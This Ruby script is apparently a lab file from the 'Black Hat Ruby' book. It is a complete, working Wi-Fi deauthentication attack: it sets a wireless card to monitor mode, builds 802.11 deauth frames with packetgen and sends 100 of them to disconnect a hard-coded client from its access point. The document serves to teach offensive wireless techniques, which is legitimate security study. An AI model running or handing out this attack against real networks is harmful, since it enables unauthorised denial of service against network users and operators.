#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Sending De-Authentication Packets
# Requirements:
#   $ apt install libpcap-dev
#   $ gem install packetgen
# 
#   Enable monitoring mode on your wireless card as *root*
#   $ iw dev
#   $ iw phy phy1 interface add mon0 type monitor && ifconfig mon0 up
# 
require 'packetgen'

iface, bssid, client = [
  'mon0',               # Interface - monitoring mode
  '2C:AB:00:A9:6C:64',  # BSSID 
  'C0:EE:FB:33:E2:09'   # Client
]

pkt = PacketGen.gen('RadioTap').
                add('Dot11::Management', mac1: client, mac2: bssid, mac3: bssid).
                add('Dot11::DeAuth', reason: 7)


puts "Sending Deauth(100 pkts) via: " + iface + ' to BSSID: ' + bssid + ' for Client: ' + client 
pkt.to_w(iface, calc: true, number: 100, interval: 0.2)
